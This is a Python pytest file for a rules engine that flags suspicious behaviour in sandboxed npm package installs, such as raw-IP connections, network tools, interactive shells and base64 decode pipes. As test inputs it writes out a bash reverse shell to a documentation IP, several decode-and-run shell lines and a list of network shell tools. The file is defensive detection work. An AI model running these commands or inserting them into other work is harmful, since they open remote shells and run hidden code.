from pathlib import Path

import pytest

from brain.rules import Severity, domain_allowed, evaluate, is_external, max_severity
from shared.contract import ConnectEvent, DetonateResult, ExecEvent

FIXTURES = Path(__file__).parent / "fixtures"
NPM = "/usr/local/bin/node"


def exec_event(binary: str, args: str, pid: int = 200, parent: str | None = "/bin/sh"):
    return ExecEvent(
        ts="2026-11-01T15:00:00Z",
        pid=pid,
        ppid=1,
        binary=binary,
        args=args,
        parent_binary=parent,
        uid=10001,
    )


def connect(daddr: str, dport: int = 443, domain: str | None = None, binary: str = NPM):
    return ConnectEvent(
        ts="2026-11-01T15:00:00Z",
        pid=300,
        binary=binary,
        daddr=daddr,
        dport=dport,
        family="AF_INET",
        resolved_domain=domain,
    )


def result(execs=(), connects=()) -> DetonateResult:
    return DetonateResult(
        job_id="t",
        status="completed",
        exit_code=0,
        duration_s=1.0,
        exec_events=list(execs),
        connect_events=list(connects),
        dns_queries=[],
        stdout_tail="",
        stderr_tail="",
    )


def rule_ids(res: DetonateResult) -> set[str]:
    return {h.rule_id for h in evaluate(res)}


# --- E4 fixture end to end ---


def test_e4_fixture_fires_raw_ip_and_net_tool_only():
    res = DetonateResult.model_validate_json((FIXTURES / "detonate_result_e4.json").read_text())
    hits = evaluate(res)
    assert {h.rule_id for h in hits} == {"NET_RAW_IP", "EXEC_NET_TOOL"}
    assert max_severity(hits) == Severity.HIGH
    raw = next(h for h in hits if h.rule_id == "NET_RAW_IP")
    assert "203.0.113.10:80" in raw.evidence


# --- benign baselines ---


@pytest.mark.parametrize(
    "args",
    [
        "-c node install.js",
        "-c node-gyp rebuild",
        "-c tsc -p .",
        "-c husky install",
        "-c node ./scripts/postinstall.js --silent -i",  # -i after -c belongs to the script
    ],
)
def test_npm_sh_c_wrapper_alone_does_not_fire(args):
    res = result(
        execs=[
            exec_event(NPM, "/usr/local/bin/npm install", pid=101, parent=None),
            exec_event("/bin/sh", args, parent=NPM),
        ],
        connects=[connect("104.16.24.34", domain="registry.npmjs.org")],
    )
    assert evaluate(res) == []


def test_empty_result_is_none():
    assert max_severity(evaluate(result())) == Severity.NONE


# --- network ---


def test_raw_ip_fires_for_test_net_demo_address():
    hits = evaluate(result(connects=[connect("203.0.113.10", 80)]))
    assert [h.rule_id for h in hits] == ["NET_RAW_IP"]
    assert hits[0].severity == Severity.HIGH


@pytest.mark.parametrize(
    "addr",
    ["127.0.0.1", "10.0.0.5", "172.17.0.1", "192.168.1.1", "169.254.169.254", "::1", "fe80::1"],
)
def test_internal_destinations_ignored(addr):
    assert evaluate(result(connects=[connect(addr)])) == []


def test_ipv4_mapped_ipv6_is_classified_by_ipv4():
    assert not is_external("::ffff:127.0.0.1")
    assert is_external("::ffff:203.0.113.10")


def test_allowed_cidr_suppresses_raw_ip():
    res = result(connects=[connect("140.82.112.3")])
    assert rule_ids(res) == {"NET_RAW_IP"}
    assert evaluate(res, allowed_cidrs=("140.82.112.0/20",)) == []


def test_unlisted_domain_is_low():
    hits = evaluate(result(connects=[connect("93.184.215.14", domain="evil.example")]))
    assert [(h.rule_id, h.severity) for h in hits] == [("NET_UNLISTED_DOMAIN", Severity.LOW)]


@pytest.mark.parametrize(
    "domain, allowed",
    [
        ("registry.npmjs.org", True),
        ("rdns:lb-140-82-112-3-iad.github.com", True),
        ("GitHub.com.", True),
        ("evilgithub.com", False),
        ("github.com.evil.example", False),
        ("rdns:registry.npmjs.org.attacker.net", False),
    ],
)
def test_domain_allowlist_suffix_matching(domain, allowed):
    assert domain_allowed(domain, ("github.com", "registry.npmjs.org")) is allowed


# --- exec ---


@pytest.mark.parametrize(
    "binary",
    [
        "/usr/bin/curl",
        "/usr/bin/wget",
        "/bin/nc",
        "/usr/bin/ncat",
        "/usr/bin/socat",
        "/bin/nc.openbsd",
    ],
)
def test_net_tools_fire(binary):
    assert rule_ids(result(execs=[exec_event(binary, "http://x")])) == {"EXEC_NET_TOOL"}


@pytest.mark.parametrize(
    "binary, args",
    [
        ("/bin/bash", "-i"),
        ("/bin/sh", "-i"),
        ("/bin/bash", "-ic id"),
        ("/bin/bash", "-c bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"),
        ("/usr/local/bin/node", "-e require('fs').openSync('/dev/udp/1.2.3.4/53')"),
    ],
)
def test_interactive_shell_is_critical(binary, args):
    hits = evaluate(result(execs=[exec_event(binary, args)]))
    assert [h.rule_id for h in hits] == ["EXEC_INTERACTIVE_SHELL"]
    assert hits[0].severity == Severity.CRITICAL


def test_non_shell_with_dash_i_does_not_fire():
    assert evaluate(result(execs=[exec_event("/usr/bin/grep", "-i foo file")])) == []


@pytest.mark.parametrize(
    "args",
    [
        "-c echo ZWNobyBoaQ== | base64 -d | sh",
        "-c echo ZWNobyBoaQ== | base64 --decode | /bin/bash",
        "-c printf %s ZWNo | base64 -di | bash",
        '-c eval "$(echo ZWNobyBoaQ== | base64 -d)"',
    ],
)
def test_decode_pipe_fires(args):
    assert "EXEC_DECODE_PIPE" in rule_ids(result(execs=[exec_event("/bin/sh", args)]))


def test_base64_decode_without_shell_does_not_fire():
    assert evaluate(result(execs=[exec_event("/bin/sh", "-c base64 -d in.b64 > out.bin")])) == []


def test_unbalanced_quotes_in_args_do_not_crash():
    hits = evaluate(result(execs=[exec_event("/bin/bash", "-i 'unterminated")]))
    assert [h.rule_id for h in hits] == ["EXEC_INTERACTIVE_SHELL"]


# --- e5-like chain and ordering ---


def test_e5_chain_sorted_most_severe_first():
    res = result(
        execs=[
            exec_event("/usr/local/bin/node", "postinstall.js", pid=150, parent="/bin/sh"),
            exec_event(
                "/bin/bash",
                "-c bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
                pid=151,
                parent="/usr/local/bin/node",
            ),
        ],
        connects=[connect("203.0.113.10", 4444, binary="/bin/bash")],
    )
    hits = evaluate(res)
    assert hits[0].rule_id == "EXEC_INTERACTIVE_SHELL"
    assert {h.rule_id for h in hits} == {"EXEC_INTERACTIVE_SHELL", "NET_RAW_IP"}
    assert max_severity(hits) == Severity.CRITICAL
